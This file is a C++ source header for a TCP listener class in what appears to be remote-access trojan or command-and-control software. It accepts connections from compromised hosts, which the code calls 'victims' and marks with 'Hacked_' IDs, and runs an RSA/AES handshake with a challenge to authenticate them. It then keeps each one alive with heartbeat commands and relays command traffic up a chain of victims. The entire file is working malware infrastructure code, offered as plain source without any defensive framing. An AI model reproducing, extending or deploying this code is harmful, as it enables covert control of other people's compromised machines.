#pragma once

#include <iostream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <thread>
#include <vector>
#include <string>
#include <memory>
#include <algorithm>
#include <atomic>
#include <unordered_map>
#include <mutex>

#include "clsLtn.hpp"

#include "clsVictim.hpp"
#include "clsEDP.hpp"
#include "clsEZData.hpp"
#include "clsTools.hpp"
#include "clsCrypto.hpp"
#include "clsDebugTools.hpp"

class clsLtnTcp : public clsLtn
{
private:
    std::shared_ptr<clsVictim> m_vicParent = nullptr;

    int m_nSktSrv = -1;
    int m_nPort;
    std::vector<std::thread> m_threads;

    std::string m_szRSAPublicKey;
    std::string m_szRSAPrivateKey;
    std::vector<unsigned char> m_vuRSAPublicKey;
    std::vector<unsigned char> m_vuRSAPrivateKey;

    std::vector<std::shared_ptr<clsVictim>> m_vVictim;
    std::mutex m_vVictimMutex;

    struct stHeartbeatCtx
    {
        std::atomic<bool> running { true };
        std::thread th;
    };

    std::unordered_map<std::shared_ptr<clsVictim>, std::shared_ptr<stHeartbeatCtx>> m_heartbeatMap;
    std::mutex m_heartbeatMutex;

    std::atomic<bool> m_closed { false };

public:
    bool m_bListening = false;

public:
    clsLtnTcp() = default;

    clsLtnTcp(std::shared_ptr<clsVictim> victim, int nPort, const std::string& szRSAPublicKey, const std::string& szRSAPrivateKey)
    {
        m_vicParent = victim;
        m_nPort = nPort;

        m_szRSAPublicKey = szRSAPublicKey;
        m_szRSAPrivateKey = szRSAPrivateKey;

        m_vuRSAPublicKey = clsEZData::fnb64Decode(szRSAPublicKey);
        m_vuRSAPrivateKey = clsEZData::fnb64Decode(szRSAPrivateKey);

        m_nSktSrv = socket(AF_INET, SOCK_STREAM, 0);
        m_bListening = false;

        sockaddr_in srvAddr {};
        srvAddr.sin_family = AF_INET;
        srvAddr.sin_port = htons(nPort);
        srvAddr.sin_addr.s_addr = INADDR_ANY;

        int nOpt = 1;
        setsockopt(m_nSktSrv, SOL_SOCKET, SO_REUSEADDR, &nOpt, sizeof(nOpt));
        bind(m_nSktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr));
    }

    ~clsLtnTcp()
    {
        fnStop();
    }

    void fnStart() override
    {
        if (m_bListening)
            return;

        listen(m_nSktSrv, 1000);
        clsTools::fnLogInfo("Listening...");
        m_bListening = true;

        while (m_bListening)
        {
            sockaddr_in clntAddr {};
            socklen_t nLen = sizeof(clntAddr);

            int nSktClnt = accept(m_nSktSrv, (sockaddr *)&clntAddr, &nLen);
            if (nSktClnt < 0)
            {
                perror("accept");
                continue;
            }

            auto victim = std::make_shared<clsVictim>(clsVictim::enMethod::TCP, nSktClnt);
            m_threads.emplace_back(&clsLtnTcp::fnHandler, this, victim, nSktClnt, clntAddr);
            m_threads.back().detach();
        }
    }

    void fnStop() override
    {
        m_bListening = false;
        close(m_nSktSrv);
    } 

    void fnSendToSub(std::string& szSubID, std::vector<std::string>& vuMsg)
    {
        std::lock_guard<std::mutex> lock(m_vVictimMutex);
        for (auto& victim : m_vVictim)
        {
            victim->fnSendCommand(vuMsg, true);
        }
    }

private:
    void fnHandler(std::shared_ptr<clsVictim> victim, int nSktClnt, sockaddr_in clntAddr)
    {
        try
        {
            clsTools::fnLogInfo("Accepted new client");

            int nRecv = 0;
            std::vector<unsigned char> vuStaticRecvBuf(clsEDP::MAX_SIZE);
            std::vector<unsigned char> vuDynamicRecvBuf;

            //clsCrypto crypto(m_vuRSAPublicKey, m_vuRSAPrivateKey);
            victim->m_crypto = std::make_unique<clsCrypto>(m_vuRSAPublicKey, m_vuRSAPrivateKey);

            // Send public key to client
            victim->fnSend(1, 0, m_szRSAPublicKey);
            std::string szVictimID = "";

            do
            {
                std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
                nRecv = recv(nSktClnt, vuStaticRecvBuf.data(), vuStaticRecvBuf.size(), 0);
                if (nRecv <= 0)
                    break;

                vuDynamicRecvBuf.insert(vuDynamicRecvBuf.end(), vuStaticRecvBuf.begin(), vuStaticRecvBuf.begin() + nRecv);

                while (true)
                {
                    if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE) break;
                    auto [nCommand, nParam, nLength] = clsEDP::fnGetHeader(vuDynamicRecvBuf);
                    if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE + static_cast<size_t>(nLength)) break;

                    clsEDP edp(vuDynamicRecvBuf);
                    vuDynamicRecvBuf = edp.fnGetMoreData();
                    auto [cmd, param, len, vuMsg] = edp.fnGetMsg();

                    if (cmd == 0 && param == 0)
                    {
                        break; // can close socket if needed
                    }
                    else if (cmd == 1)
                    {
                        if (param == 1)
                        {
                            std::string szb64Cipher(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                            std::vector<unsigned char> abCipher = clsEZData::fnb64Decode(szb64Cipher);
                            std::vector<unsigned char> abPlain = victim->m_crypto->fnvuRSADecrypt(abCipher.data(), abCipher.size());

                            std::string szPlain(abPlain.begin(), abPlain.end());
                            auto pos = szPlain.find('|');

                            std::string szKey = szPlain.substr(0, pos);
                            std::string szIV = szPlain.substr(pos + 1);

                            std::vector<unsigned char> vuAESKey = clsEZData::fnb64Decode(szKey);
                            std::vector<unsigned char> vuAESIV = clsEZData::fnb64Decode(szIV);

                            victim->m_crypto->fnAesSetNewKeyIV(vuAESKey, vuAESIV);

                            std::string szChallenge = clsEZData::fnszGenerateRandomStr();
                            victim->m_crypto->m_szChallenge = szChallenge;
                            victim->fnSend(1, 2, szChallenge);
                        }
                        else if (param == 3)
                        {
                            std::string szb64Cipher(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
                            std::vector<unsigned char> vuCipher = clsEZData::fnb64Decode(szb64Cipher);
                            std::vector<unsigned char> vuPlain = victim->m_crypto->fnvuAESDecrypt(vuCipher.data(), vuCipher.size());
                            std::string szPlain(reinterpret_cast<const char*>(vuPlain.data()), vuPlain.size());

                            if (szPlain == victim->m_crypto->m_szChallenge)
                            {
                                {
                                    std::lock_guard<std::mutex> lock(m_vVictimMutex);
                                    m_vVictim.push_back(victim);
                                }

                                //victim->fnSendCommand(ls, true);

                                auto hb = std::make_shared<stHeartbeatCtx>();
                                std::weak_ptr<clsVictim> wvictim = victim;
                                hb->th = std::thread([this, wvictim, hb]() 
                                {
                                    while (hb->running) {
                                        auto v = wvictim.lock();
                                        if (!v) {
                                            break;
                                        }

                                        try {
                                            STRLIST ls = { "info" };
                                            v->fnSendCommand(ls, true);
                                        } catch (...) {
                                            break;
                                        }

                                        std::this_thread::sleep_for(std::chrono::seconds(1));
                                    }
                                });

                                std::lock_guard<std::mutex> lock(m_heartbeatMutex);
                                m_heartbeatMap[victim] = hb;

                                clsTools::fnLogInfo("New client validated and connected");
                            }
                            else
                            {
                                clsTools::fnLogErr("Validation failed");
                            }
                        }
                    }
                    else if (cmd == 2 && param == 0)
                    {
                        std::vector<unsigned char> vuPlain = victim->m_crypto->fnvuAESDecrypt(vuMsg);
                        std::string szMsg(vuPlain.begin(), vuPlain.end());

                        auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
                        
                        std::vector<std::string> vuVictim;
                        std::vector<std::string> vuMsg;
                        for (int i = 0; i < decoded.size(); i++)
                        {
                            if (decoded[i].rfind("Hacked_", 0) == 0)
                                vuVictim.push_back(decoded[i]);
                            else
                            {
                                vuMsg.reserve(decoded.size() - i - 1);
                                vuMsg.insert(vuMsg.end(), decoded.begin() + i, decoded.end());
                                break;
                            }
                        }

                        if (vuMsg[0] == "info")
                        {
                            szVictimID = vuMsg[4];
                            victim->m_szVictimID = vuMsg[4];
                        }

                        m_vicParent->fnSendCommand(decoded);
                    }
                }

            } while (nRecv > 0);

            std::shared_ptr<stHeartbeatCtx> hb;
            {
                std::lock_guard<std::mutex> lock(m_heartbeatMutex);
                auto it = m_heartbeatMap.find(victim);
                if (it != m_heartbeatMap.end())
                {
                    hb = it->second;
                    m_heartbeatMap.erase(it);
                }
            }

            if (hb)
            {
                hb->running = false;
                if (hb->th.joinable() && std::this_thread::get_id() != hb->th.get_id())
                {
                    hb->th.detach();
                }
            }

            STRLIST ls = {
                "disconnect",
                victim->m_szVictimID,
            };

            m_vicParent->fnSendCommand(ls);

            // erase disconnected victim safely
            {
                std::lock_guard<std::mutex> lock(m_vVictimMutex);
                m_vVictim.erase(
                    std::remove(m_vVictim.begin(), m_vVictim.end(), victim),
                    m_vVictim.end()
                );
            }

            clsTools::fnLogInfo("Client disconnected: " + szVictimID);
        }
        catch (const std::exception& e)
        {
            clsTools::fnLogErr(e.what());
        }
    }
};
